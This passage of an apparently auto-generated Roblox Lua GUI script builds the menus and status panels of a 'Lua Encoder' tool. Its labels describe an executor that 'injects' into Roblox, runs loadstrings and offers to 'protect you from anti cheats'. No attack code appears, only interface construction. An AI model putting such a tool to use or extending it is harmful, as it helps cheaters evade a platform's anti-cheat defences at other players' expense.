G2L["4e"] = Instance.new("TextLabel", G2L["4d"]);
G2L["4e"]["BorderSizePixel"] = 0;
G2L["4e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4e"]["TextSize"] = 14;
G2L["4e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4e"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4e"]["Size"] = UDim2.new(1, 0, 0.14417, 0);
G2L["4e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4e"]["Text"] = [[Credits]];
G2L["4e"]["Name"] = [[Title]];
G2L["4e"]["Position"] = UDim2.new(-0, 0, 0, 0);

-- StarterGui.LuaEncoderPC.Credits.Title.UICorner
G2L["4f"] = Instance.new("UICorner", G2L["4e"]);


-- StarterGui.LuaEncoderPC.Credits.Title.UIStroke
G2L["50"] = Instance.new("UIStroke", G2L["4e"]);
G2L["50"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.LuaEncoderPC.Credits.CreditMain
G2L["51"] = Instance.new("LocalScript", G2L["4d"]);
G2L["51"]["Name"] = [[CreditMain]];

-- StarterGui.LuaEncoderPC.Credits.UICorner
G2L["52"] = Instance.new("UICorner", G2L["4d"]);


-- StarterGui.LuaEncoderPC.Credits.UIStroke
G2L["53"] = Instance.new("UIStroke", G2L["4d"]);
G2L["53"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.LuaEncoderPC.Credits.TextBox
G2L["54"] = Instance.new("TextBox", G2L["4d"]);
G2L["54"]["Interactable"] = false;
G2L["54"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["54"]["BorderSizePixel"] = 0;
G2L["54"]["TextEditable"] = false;
G2L["54"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["54"]["TextWrapped"] = true;
G2L["54"]["TextSize"] = 14;
G2L["54"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["54"]["TextScaled"] = true;
G2L["54"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["54"]["ShowNativeInput"] = false;
G2L["54"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["54"]["MultiLine"] = true;
G2L["54"]["ClearTextOnFocus"] = false;
G2L["54"]["Size"] = UDim2.new(0.90356, 0, 0.63004, 0);
G2L["54"]["Position"] = UDim2.new(0.05028, 0, 0.24027, 0);
G2L["54"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["54"]["Text"] = [[-- made by plumsy.dev]];

-- StarterGui.LuaEncoderPC.Credits.TextBox.UIStroke
G2L["55"] = Instance.new("UIStroke", G2L["54"]);
G2L["55"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.LuaEncoderPC.Credits.TextBox.UICorner
G2L["56"] = Instance.new("UICorner", G2L["54"]);


-- StarterGui.LuaEncoderPC.Credits.TextBox.UITextSizeConstraint
G2L["57"] = Instance.new("UITextSizeConstraint", G2L["54"]);
G2L["57"]["MaxTextSize"] = 14;

-- StarterGui.LuaEncoderPC.About
G2L["58"] = Instance.new("Frame", G2L["1"]);
G2L["58"]["Visible"] = false;
G2L["58"]["ZIndex"] = 999999999;
G2L["58"]["BorderSizePixel"] = 0;
G2L["58"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
G2L["58"]["Size"] = UDim2.new(0.23398, 0, 0.42416, 0);
G2L["58"]["Position"] = UDim2.new(0.6532, 0, 0.15074, 0);
G2L["58"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["58"]["Name"] = [[About]];

-- StarterGui.LuaEncoderPC.About.Title
G2L["59"] = Instance.new("TextLabel", G2L["58"]);
G2L["59"]["BorderSizePixel"] = 0;
G2L["59"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["59"]["TextSize"] = 14;
G2L["59"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["59"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["59"]["Size"] = UDim2.new(1, 0, 0.14417, 0);
G2L["59"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["59"]["Text"] = [[About]];
G2L["59"]["Name"] = [[Title]];
G2L["59"]["Position"] = UDim2.new(-0, 0, 0, 0);

-- StarterGui.LuaEncoderPC.About.Title.UICorner
G2L["5a"] = Instance.new("UICorner", G2L["59"]);


-- StarterGui.LuaEncoderPC.About.Title.UIStroke
G2L["5b"] = Instance.new("UIStroke", G2L["59"]);
G2L["5b"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.LuaEncoderPC.About.Aboutmain
G2L["5c"] = Instance.new("LocalScript", G2L["58"]);
G2L["5c"]["Name"] = [[Aboutmain]];

-- StarterGui.LuaEncoderPC.About.UICorner
G2L["5d"] = Instance.new("UICorner", G2L["58"]);


-- StarterGui.LuaEncoderPC.About.UIStroke
G2L["5e"] = Instance.new("UIStroke", G2L["58"]);
G2L["5e"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.LuaEncoderPC.About.TextBox
G2L["5f"] = Instance.new("TextBox", G2L["58"]);
G2L["5f"]["Interactable"] = false;
G2L["5f"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5f"]["BorderSizePixel"] = 0;
G2L["5f"]["TextEditable"] = false;
G2L["5f"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["5f"]["TextWrapped"] = true;
G2L["5f"]["TextSize"] = 14;
G2L["5f"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["5f"]["TextScaled"] = true;
G2L["5f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5f"]["ShowNativeInput"] = false;
G2L["5f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5f"]["MultiLine"] = true;
G2L["5f"]["ClearTextOnFocus"] = false;
G2L["5f"]["Size"] = UDim2.new(0.90356, 0, 0.63004, 0);
G2L["5f"]["Position"] = UDim2.new(0.05028, 0, 0.24027, 0);
G2L["5f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5f"]["Text"] = [[-- This can execute: loadstrings, coroutine, tasks, while, for, if, do, etc
-- This can be an executor that works in the future i think lol (I need to do more researching).
-- End i think...]];

-- StarterGui.LuaEncoderPC.About.TextBox.UIStroke
G2L["60"] = Instance.new("UIStroke", G2L["5f"]);
G2L["60"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.LuaEncoderPC.About.TextBox.UICorner
G2L["61"] = Instance.new("UICorner", G2L["5f"]);


-- StarterGui.LuaEncoderPC.About.TextBox.UITextSizeConstraint
G2L["62"] = Instance.new("UITextSizeConstraint", G2L["5f"]);
G2L["62"]["MaxTextSize"] = 14;

-- StarterGui.LuaEncoderPC.Settings
G2L["63"] = Instance.new("Frame", G2L["1"]);
G2L["63"]["Visible"] = false;
G2L["63"]["ZIndex"] = 999999999;
G2L["63"]["BorderSizePixel"] = 0;
G2L["63"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
G2L["63"]["Size"] = UDim2.new(0.23398, 0, 0.42416, 0);
G2L["63"]["Position"] = UDim2.new(0.6532, 0, 0.15074, 0);
G2L["63"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["63"]["Name"] = [[Settings]];

-- StarterGui.LuaEncoderPC.Settings.Title
G2L["64"] = Instance.new("TextLabel", G2L["63"]);
G2L["64"]["BorderSizePixel"] = 0;
G2L["64"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["64"]["TextSize"] = 14;
G2L["64"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["64"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["64"]["Size"] = UDim2.new(1, 0, 0.14417, 0);
G2L["64"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["64"]["Text"] = [[Settings]];
G2L["64"]["Name"] = [[Title]];
G2L["64"]["Position"] = UDim2.new(-0, 0, 0, 0);

-- StarterGui.LuaEncoderPC.Settings.Title.UICorner
G2L["65"] = Instance.new("UICorner", G2L["64"]);


-- StarterGui.LuaEncoderPC.Settings.Title.UIStroke
G2L["66"] = Instance.new("UIStroke", G2L["64"]);
G2L["66"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.LuaEncoderPC.Settings.SettingsMain
G2L["67"] = Instance.new("LocalScript", G2L["63"]);
G2L["67"]["Name"] = [[SettingsMain]];

-- StarterGui.LuaEncoderPC.Settings.UICorner
G2L["68"] = Instance.new("UICorner", G2L["63"]);


-- StarterGui.LuaEncoderPC.Settings.UIStroke
G2L["69"] = Instance.new("UIStroke", G2L["63"]);
G2L["69"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.LuaEncoderPC.Settings.Option1
G2L["6a"] = Instance.new("TextButton", G2L["63"]);
G2L["6a"]["TextWrapped"] = true;
G2L["6a"]["BorderSizePixel"] = 0;
G2L["6a"]["TextSize"] = 14;
G2L["6a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6a"]["TextScaled"] = true;
G2L["6a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6a"]["Size"] = UDim2.new(0.79777, 0, 0.14516, 0);
G2L["6a"]["Name"] = [[Option1]];
G2L["6a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6a"]["Text"] = [[Protect you from anti cheats]];
G2L["6a"]["Position"] = UDim2.new(0.0838, 0, 0.20523, 0);

-- StarterGui.LuaEncoderPC.Settings.Option1.UITextSizeConstraint
G2L["6b"] = Instance.new("UITextSizeConstraint", G2L["6a"]);
G2L["6b"]["MaxTextSize"] = 14;

-- StarterGui.LuaEncoderPC.Settings.Option1.UIStroke
G2L["6c"] = Instance.new("UIStroke", G2L["6a"]);
G2L["6c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["6c"]["Color"] = Color3.fromRGB(255, 0, 0);

-- StarterGui.LuaEncoderPC.Settings.useless
G2L["6d"] = Instance.new("TextButton", G2L["63"]);
G2L["6d"]["TextWrapped"] = true;
G2L["6d"]["BorderSizePixel"] = 0;
G2L["6d"]["TextSize"] = 14;
G2L["6d"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6d"]["TextScaled"] = true;
G2L["6d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6d"]["Size"] = UDim2.new(0.79777, 0, 0.13014, 0);
G2L["6d"]["Name"] = [[useless]];
G2L["6d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6d"]["Text"] = [[useless]];
G2L["6d"]["Position"] = UDim2.new(0.0838, 0, 0.34538, 0);

-- StarterGui.LuaEncoderPC.Settings.useless.UITextSizeConstraint
G2L["6e"] = Instance.new("UITextSizeConstraint", G2L["6d"]);
G2L["6e"]["MaxTextSize"] = 14;

-- StarterGui.LuaEncoderPC.Settings.useless.UIStroke
G2L["6f"] = Instance.new("UIStroke", G2L["6d"]);
G2L["6f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["6f"]["Color"] = Color3.fromRGB(255, 0, 0);

-- StarterGui.LuaEncoderPC.Settings.icon
G2L["70"] = Instance.new("TextButton", G2L["63"]);
G2L["70"]["TextWrapped"] = true;
G2L["70"]["BorderSizePixel"] = 0;
G2L["70"]["TextSize"] = 14;
G2L["70"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["70"]["TextScaled"] = true;
G2L["70"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["70"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["70"]["Size"] = UDim2.new(0.79777, 0, 0.11012, 0);
G2L["70"]["Name"] = [[icon]];
G2L["70"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["70"]["Text"] = [[Floating Icon]];
G2L["70"]["Position"] = UDim2.new(0.0838, 0, 0.47052, 0);

-- StarterGui.LuaEncoderPC.Settings.icon.UITextSizeConstraint
G2L["71"] = Instance.new("UITextSizeConstraint", G2L["70"]);
G2L["71"]["MaxTextSize"] = 14;

-- StarterGui.LuaEncoderPC.Settings.icon.UIStroke
G2L["72"] = Instance.new("UIStroke", G2L["70"]);
G2L["72"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["72"]["Color"] = Color3.fromRGB(255, 0, 0);

-- StarterGui.LuaEncoderPC.Settings.link
G2L["73"] = Instance.new("TextButton", G2L["63"]);
G2L["73"]["TextWrapped"] = true;
G2L["73"]["BorderSizePixel"] = 0;
G2L["73"]["TextSize"] = 14;
G2L["73"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["73"]["TextScaled"] = true;
G2L["73"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["73"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["73"]["Size"] = UDim2.new(0.79777, 0, 0.12514, 0);
G2L["73"]["Name"] = [[link]];
G2L["73"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["73"]["Text"] = [[Get delta link and all my scripts link]];
G2L["73"]["Position"] = UDim2.new(0.0838, 0, 0.57564, 0);

-- StarterGui.LuaEncoderPC.Settings.link.UITextSizeConstraint
G2L["74"] = Instance.new("UITextSizeConstraint", G2L["73"]);
G2L["74"]["MaxTextSize"] = 14;

-- StarterGui.LuaEncoderPC.Settings.link.UIStroke
G2L["75"] = Instance.new("UIStroke", G2L["73"]);
G2L["75"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["75"]["Color"] = Color3.fromRGB(255, 0, 0);

-- StarterGui.LuaEncoderPC.Settings.Change
G2L["76"] = Instance.new("TextButton", G2L["63"]);
G2L["76"]["TextWrapped"] = true;
G2L["76"]["BorderSizePixel"] = 0;
G2L["76"]["TextSize"] = 14;
G2L["76"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["76"]["TextScaled"] = true;
G2L["76"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["76"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["76"]["Size"] = UDim2.new(0.79777, 0, 0.12514, 0);
G2L["76"]["Name"] = [[Change]];
G2L["76"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["76"]["Text"] = [[change execute button state]];
G2L["76"]["Visible"] = false;
G2L["76"]["Position"] = UDim2.new(0.0838, 0, 0.69577, 0);

-- StarterGui.LuaEncoderPC.Settings.Change.UITextSizeConstraint
G2L["77"] = Instance.new("UITextSizeConstraint", G2L["76"]);
G2L["77"]["MaxTextSize"] = 14;

-- StarterGui.LuaEncoderPC.Settings.Change.UIStroke
G2L["78"] = Instance.new("UIStroke", G2L["76"]);
G2L["78"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["78"]["Color"] = Color3.fromRGB(255, 0, 0);

-- StarterGui.LuaEncoderPC.Open
G2L["79"] = Instance.new("ImageButton", G2L["1"]);
G2L["79"]["BorderSizePixel"] = 0;
G2L["79"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["79"]["ZIndex"] = 999999999;
G2L["79"]["Image"] = [[rbxassetid://17546664635]];
G2L["79"]["Size"] = UDim2.new(0.057, 0, 0.12, 0);
G2L["79"]["Name"] = [[Open]];
G2L["79"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["79"]["Position"] = UDim2.new(0.66275, 0, 0.02972, 0);

-- StarterGui.LuaEncoderPC.Open.UICorner
G2L["7a"] = Instance.new("UICorner", G2L["79"]);


-- StarterGui.LuaEncoderPC.Open.OpenMain
G2L["7b"] = Instance.new("LocalScript", G2L["79"]);
G2L["7b"]["Name"] = [[OpenMain]];

-- StarterGui.LuaEncoderPC.InjectedFrame
G2L["7c"] = Instance.new("Frame", G2L["1"]);
G2L["7c"]["Visible"] = false;
G2L["7c"]["ZIndex"] = 999999999;
G2L["7c"]["BorderSizePixel"] = 0;
G2L["7c"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
G2L["7c"]["Size"] = UDim2.new(0.34771, 0, 0.15711, 0);
G2L["7c"]["Position"] = UDim2.new(0.63274, 0, 0.82166, 0);
G2L["7c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7c"]["Name"] = [[InjectedFrame]];

-- StarterGui.LuaEncoderPC.InjectedFrame.UICorner
G2L["7d"] = Instance.new("UICorner", G2L["7c"]);


-- StarterGui.LuaEncoderPC.InjectedFrame.LocalScript
G2L["7e"] = Instance.new("LocalScript", G2L["7c"]);


-- StarterGui.LuaEncoderPC.InjectedFrame.Title
G2L["7f"] = Instance.new("TextLabel", G2L["7c"]);
G2L["7f"]["ZIndex"] = 999999999;
G2L["7f"]["BorderSizePixel"] = 0;
G2L["7f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7f"]["TextSize"] = 14;
G2L["7f"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7f"]["BackgroundTransparency"] = 1;
G2L["7f"]["Size"] = UDim2.new(0, 69, 0, 29);
G2L["7f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7f"]["Text"] = [[Lua Encoder]];
G2L["7f"]["Name"] = [[Title]];
G2L["7f"]["Position"] = UDim2.new(0.05621, 0, 0, 0);

-- StarterGui.LuaEncoderPC.InjectedFrame.Desc
G2L["80"] = Instance.new("TextLabel", G2L["7c"]);
G2L["80"]["ZIndex"] = 999999999;
G2L["80"]["BorderSizePixel"] = 0;
G2L["80"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["80"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["80"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["80"]["TextSize"] = 14;
G2L["80"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["80"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["80"]["BackgroundTransparency"] = 1;
G2L["80"]["Size"] = UDim2.new(0, 264, 0, 45);
G2L["80"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["80"]["Text"] = [[Has injected to roblox]];
G2L["80"]["Name"] = [[Desc]];
G2L["80"]["Position"] = UDim2.new(0.00752, 0, 0.39189, 0);

-- StarterGui.LuaEncoderPC.InjectedFrame.ImageLabel
G2L["81"] = Instance.new("ImageLabel", G2L["7c"]);
G2L["81"]["ZIndex"] = 999999999;
G2L["81"]["BorderSizePixel"] = 0;
G2L["81"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["81"]["Image"] = [[rbxassetid://17546664635]];
G2L["81"]["Size"] = UDim2.new(0.12155, 0, 0.39189, 0);
G2L["81"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["81"]["BackgroundTransparency"] = 1;
G2L["81"]["Position"] = UDim2.new(0.87594, 0, 0, 0);

-- StarterGui.LuaEncoderPC.InjectedFrame.UIStroke
G2L["82"] = Instance.new("UIStroke", G2L["7c"]);


-- StarterGui.LuaEncoderPC.NotInjF
G2L["83"] = Instance.new("Frame", G2L["1"]);
G2L["83"]["Visible"] = false;
G2L["83"]["ZIndex"] = 999999999;
G2L["83"]["BorderSizePixel"] = 0;
G2L["83"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
G2L["83"]["Size"] = UDim2.new(0.34771, 0, 0.15711, 0);
G2L["83"]["Position"] = UDim2.new(0.63274, 0, 0.82166, 0);
G2L["83"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["83"]["Name"] = [[NotInjF]];

-- StarterGui.LuaEncoderPC.NotInjF.UICorner
G2L["84"] = Instance.new("UICorner", G2L["83"]);


-- StarterGui.LuaEncoderPC.NotInjF.LocalScript
G2L["85"] = Instance.new("LocalScript", G2L["83"]);


-- StarterGui.LuaEncoderPC.NotInjF.Title
G2L["86"] = Instance.new("TextLabel", G2L["83"]);
G2L["86"]["ZIndex"] = 999999999;
G2L["86"]["BorderSizePixel"] = 0;
G2L["86"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["86"]["TextSize"] = 14;
G2L["86"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["86"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["86"]["BackgroundTransparency"] = 1;
G2L["86"]["Size"] = UDim2.new(0, 70, 0, 29);
G2L["86"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["86"]["Text"] = [[Lua Encoder]];
G2L["86"]["Name"] = [[Title]];
G2L["86"]["Position"] = UDim2.new(0.05245, 0, 0, 0);

-- StarterGui.LuaEncoderPC.NotInjF.Desc
G2L["87"] = Instance.new("TextLabel", G2L["83"]);
G2L["87"]["ZIndex"] = 999999999;
G2L["87"]["BorderSizePixel"] = 0;
G2L["87"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["87"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["87"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["87"]["TextSize"] = 14;
G2L["87"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["87"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["87"]["BackgroundTransparency"] = 1;
G2L["87"]["Size"] = UDim2.new(0, 264, 0, 45);
G2L["87"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["87"]["Text"] = [[Isn't Injected to roblox.]];
G2L["87"]["Name"] = [[Desc]];
G2L["87"]["Position"] = UDim2.new(0.00752, 0, 0.39189, 0);

-- StarterGui.LuaEncoderPC.NotInjF.ImageLabel
G2L["88"] = Instance.new("ImageLabel", G2L["83"]);
G2L["88"]["ZIndex"] = 999999999;
G2L["88"]["BorderSizePixel"] = 0;
G2L["88"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["88"]["Image"] = [[rbxassetid://17546664635]];
G2L["88"]["Size"] = UDim2.new(0.12155, 0, 0.39189, 0);
G2L["88"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["88"]["BackgroundTransparency"] = 1;
G2L["88"]["Position"] = UDim2.new(0.87594, 0, 0, 0);

-- StarterGui.LuaEncoderPC.NotInjF.UIStroke
G2L["89"] = Instance.new("UIStroke", G2L["83"]);


-- StarterGui.LuaEncoderPC.InjectingFrame
G2L["8a"] = Instance.new("Frame", G2L["1"]);
G2L["8a"]["Visible"] = false;
G2L["8a"]["ZIndex"] = 999999999;
G2L["8a"]["BorderSizePixel"] = 0;
G2L["8a"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
G2L["8a"]["Size"] = UDim2.new(0.34771, 0, 0.15711, 0);
G2L["8a"]["Position"] = UDim2.new(0.63274, 0, 0.82166, 0);
G2L["8a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8a"]["Name"] = [[InjectingFrame]];

-- StarterGui.LuaEncoderPC.InjectingFrame.UICorner
G2L["8b"] = Instance.new("UICorner", G2L["8a"]);


-- StarterGui.LuaEncoderPC.InjectingFrame.LocalScript
G2L["8c"] = Instance.new("LocalScript", G2L["8a"]);


-- StarterGui.LuaEncoderPC.InjectingFrame.Title
G2L["8d"] = Instance.new("TextLabel", G2L["8a"]);
G2L["8d"]["ZIndex"] = 999999999;
G2L["8d"]["BorderSizePixel"] = 0;
G2L["8d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8d"]["TextSize"] = 14;
G2L["8d"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["8d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8d"]["BackgroundTransparency"] = 1;
G2L["8d"]["Size"] = UDim2.new(0, 73, 0, 29);
G2L["8d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8d"]["Text"] = [[Lua Encoder]];
G2L["8d"]["Name"] = [[Title]];
G2L["8d"]["Position"] = UDim2.new(0.04118, 0, 0, 0);

-- StarterGui.LuaEncoderPC.InjectingFrame.Desc
G2L["8e"] = Instance.new("TextLabel", G2L["8a"]);
G2L["8e"]["ZIndex"] = 999999999;
G2L["8e"]["BorderSizePixel"] = 0;
G2L["8e"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["8e"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["8e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8e"]["TextSize"] = 14;
G2L["8e"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["8e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8e"]["BackgroundTransparency"] = 1;
G2L["8e"]["Size"] = UDim2.new(0, 264, 0, 45);
G2L["8e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8e"]["Text"] = [[Injecting]];
G2L["8e"]["Name"] = [[Desc]];
G2L["8e"]["Position"] = UDim2.new(0.00752, 0, 0.39189, 0);

-- StarterGui.LuaEncoderPC.InjectingFrame.ImageLabel
G2L["8f"] = Instance.new("ImageLabel", G2L["8a"]);
G2L["8f"]["ZIndex"] = 999999999;
G2L["8f"]["BorderSizePixel"] = 0;
G2L["8f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8f"]["Image"] = [[rbxassetid://17546664635]];
G2L["8f"]["Size"] = UDim2.new(0.12155, 0, 0.39189, 0);
G2L["8f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8f"]["BackgroundTransparency"] = 1;
G2L["8f"]["Position"] = UDim2.new(0.87594, 0, 0, 0);

-- StarterGui.LuaEncoderPC.InjectingFrame.UIStroke
G2L["90"] = Instance.new("UIStroke", G2L["8a"]);


-- StarterGui.LuaEncoderPC.AlrInjcFrame
G2L["91"] = Instance.new("Frame", G2L["1"]);
G2L["91"]["Visible"] = false;
G2L["91"]["ZIndex"] = 999999999;
G2L["91"]["BorderSizePixel"] = 0;
G2L["91"]["BackgroundColor3"] = Color3.fromRGB(59, 59, 59);
G2L["91"]["Size"] = UDim2.new(0.34771, 0, 0.15711, 0);
G2L["91"]["Position"] = UDim2.new(0.63274, 0, 0.82166, 0);
G2L["91"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["91"]["Name"] = [[AlrInjcFrame]];

-- StarterGui.LuaEncoderPC.AlrInjcFrame.UICorner
G2L["92"] = Instance.new("UICorner", G2L["91"]);


-- StarterGui.LuaEncoderPC.AlrInjcFrame.LocalScript
G2L["93"] = Instance.new("LocalScript", G2L["91"]);


-- StarterGui.LuaEncoderPC.AlrInjcFrame.Title
G2L["94"] = Instance.new("TextLabel", G2L["91"]);
G2L["94"]["ZIndex"] = 999999999;
G2L["94"]["BorderSizePixel"] = 0;
G2L["94"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["94"]["TextSize"] = 14;
G2L["94"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["94"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["94"]["BackgroundTransparency"] = 1;
G2L["94"]["Size"] = UDim2.new(0, 74, 0, 29);
G2L["94"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["94"]["Text"] = [[Lua Encoder]];
G2L["94"]["Name"] = [[Title]];
G2L["94"]["Position"] = UDim2.new(0.03742, 0, 0, 0);

-- StarterGui.LuaEncoderPC.AlrInjcFrame.Desc
G2L["95"] = Instance.new("TextLabel", G2L["91"]);
G2L["95"]["ZIndex"] = 999999999;
G2L["95"]["BorderSizePixel"] = 0;
G2L["95"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["95"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["95"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["95"]["TextSize"] = 14;
G2L["95"]["FontFace"] = Font.new([[rbxasset://fonts/families/FredokaOne.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["95"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["95"]["BackgroundTransparency"] = 1;
G2L["95"]["Size"] = UDim2.new(0, 264, 0, 45);
G2L["95"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
